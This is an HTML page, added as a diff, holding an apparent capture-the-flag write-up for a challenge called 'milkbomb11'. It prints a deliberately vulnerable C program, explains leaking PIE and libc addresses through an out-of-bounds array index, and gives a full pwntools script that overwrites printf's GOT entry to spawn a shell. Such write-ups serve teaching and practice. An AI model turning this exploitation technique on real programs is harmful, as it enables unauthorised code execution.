@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>milkbomb11</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+
+    <header>
+        <h1>milkbomb11</h1>
+        <a href="/index.html">[to index]</a>
+    </header>
+
+    <main>
+        <p>The problem can be seen <a href="">here</a></p>
+        <p>The source code of the target program is as below.</p>
+        <pre><code>
+// gcc -o main main.c -Wl,-z,norelro
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <unistd.h>
+#include <fcntl.h>
+
+uint64_t arr[64] = {0};
+
+void initialize() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+
+    for (int i = 0; i < 64; i++)
+        arr[i] = 1ul << i;
+}
+
+void print_menu() {
+    puts("1. XOR two values");
+    puts("2. Print one value");
+    printf("> ");
+}
+
+void xor() {
+    int32_t i, j;
+    printf("Enter i & j > ");
+    scanf("%d%d", &i, &j);
+    arr[i] ^= arr[j];
+}
+
+void print() {
+    uint32_t i;
+    printf("Enter i > ");
+    scanf("%d", &i);
+    printf("Value: %lx\n", arr[i]);
+}
+
+void win() {
+    system("/bin/sh");
+}
+
+int main() {
+    int option, i, j;
+
+    initialize();
+    while (1) {
+        print_menu();
+        scanf("%d", &option);
+        if (option == 1) {
+            xor();
+        } else if (option == 2) {
+            print();
+        } else {
+            break;
+        }
+    }
+
+    return 0;
+}
+        </code></pre>
+        <p>Running checksec, I could see that the program had everything enabled except for RELRO, 
+            suggesting that I could perform a GOT table overwrite attack.</p>
+        <img src="checksec.png">
+        <p>
+            Using the out-of-bounds vulnerability present in <code>arr</code>, I was able to get the GOT entry of <code>printf</code> and
+            additionally the base of libc, although the latter was proven to be useless in solving this problem. My plan was to overwrite the
+            GOT entry of <code>printf</code> with the address of <code>win</code>, but there was a problem: I had to get the base of PIE somehow.
+            Since the checksec stated that the program had no RELRO, I assumed the GOT entries of registered but unused functions like <code>system</code>
+            or <code>__stack_chk_fail</code> would point to its PLT stub, allowing me to obtain the PIE base. However my assumption was wrong as
+            those functions' GOT entries were somehow pre-filled. (I still don't know why though, maybe it's security measure from the server.)
+        </p>
+        <p>
+            Still, to obtain the base of PIE, I built an exploit script that leaks all the GOT entries and more
+            via the out-of-bound vulnerability in <code>arr</code>.
+            I ran that exploit code multiple times and found a pattern: the entry at <code>arr[-35]</code> (and a few more entries looking back) 
+            is always in the range of where the PIE base is normally is.
+            I attached gdb suspecting the offset of <code>arr[-35]</code> and the base of PIE was fixed, and found out it was indeed fixed to 0x5dc.
+        </p>
+        <img src="arr-35.png">
+        <img src="vmmap.png">
+        <p>
+            Using this info I was able to obtain the base of PIE and the address of <code>win</code>. 
+            My next step was to overwrite the GOT entry of <code>printf</code> with the obtained value.
+            In my first attempt of doing so, I reconstructed address of <code>win</code> in <code>arr[67]</code>,
+            zeroed out the GOT entry of <code>printf</code>, and overwrote it with the previously obtained value,
+            but this failed since <code>printf</code> was called between the zeroing out of the GOT entry and the
+            overwriting of the entry. So in my second attempt I constructed <code>win^printf</code> in <code>arr[67]</code> instead of 
+            <code>win</code>. Now, if we XOR-ed that value to the GOT entry of <code>printf</code>, <code>printf^win^printf = win</code>, 
+            thus, overwriting <code>printf</code> could be done in one go, before any instance of <code>printf</code> was called.
+        </p>
+        <p>The exploit code is as below.</p>
+        <pre><code>
+#!/usr/bin/python3
+from pwn import *
+
+def ex():
+    #context.log_level = "debug"
+    #p = process("./main")
+    libc = ELF("./libc.so.6")
+    p = remote("localhost", 5000)
+
+    def get_entry_of_index (idx:int) -> int:
+        p.sendlineafter(b"> ", b"1")
+        p.sendlineafter(b"> ", b"%d %d" % (64+idx, 64+idx))
+        p.sendlineafter(b"> ", b"1")
+        p.sendlineafter(b"> ", b"%d -%d" % (64+idx, idx))
+        p.sendlineafter(b"> ", b"2")
+        p.sendlineafter(b"> ", b"%d" % (64+idx))
+        got_entry = int(p.recvline().split(b": ")[1], 16)
+        print(f"arr[{-idx}] = {got_entry:x}")
+        return got_entry
+
+    input()
+    for i in range(1, 128):
+        get_entry_of_index(i)
+
+    p.sendlineafter(b"> ", b"1")
+    p.sendlineafter(b"> ", b"65 65")
+    p.sendlineafter(b"> ", b"1")
+    p.sendlineafter(b"> ", b"65 -16")
+    p.sendlineafter(b"> ", b"2")
+    p.sendlineafter(b"> ", b"65")
+    printf_got_entry = get_entry_of_index(16)
+    libc_base = printf_got_entry - libc.symbols["printf"]
+    print(f"{libc_base=:x}")
+
+    p.sendlineafter(b"> ", b"1")
+    p.sendlineafter(b"> ", b"66 66")
+    p.sendlineafter(b"> ", b"1")
+    p.sendlineafter(b"> ", b"66 -35")
+    p.sendlineafter(b"> ", b"2")
+    p.sendlineafter(b"> ", b"66")
+    pie_leak = int(p.recvline().split(b": ")[1], 16)
+    pie_base = pie_leak - 0x5dc
+    print(f"{pie_base=:x}")
+
+    win_addr = pie_base + 0x13ed
+    p.sendlineafter(b"> ", b"1")
+    p.sendlineafter(b"> ", b"67 67")
+    for i in range(0,63):
+        b = 2**i
+        if (b & win_addr) >> i > 0:
+            p.sendlineafter(b"> ", b"1")
+            p.sendlineafter(b"> ", b"67 %d" % (i))
+
+    p.sendlineafter(b"> ", b"2")
+    p.sendlineafter(b"> ", b"67")
+    win_leak = int(p.recvline().split(b": ")[1], 16)
+    if win_leak == win_addr: print(f"{win_leak=:x} === {win_addr=:x}")
+
+    p.sendlineafter(b"> ", b"1")
+    p.sendlineafter(b"> ", b"68 68")
+    for i in range(0, 63):
+        b = 2**i
+        if (b & (win_addr ^ printf_got_entry)) >> i > 0:
+            p.sendlineafter(b"> ", b"1")
+            p.sendlineafter(b"> ", b"68 %d" % (i))
+
+    p.sendlineafter(b"> ", b"1")
+    p.sendlineafter(b"> ", b"-16 68")
+    p.interactive()
+
+if __name__ == "__main__": ex()
+        </code></pre>
+    </main>
+</body>
+</html>
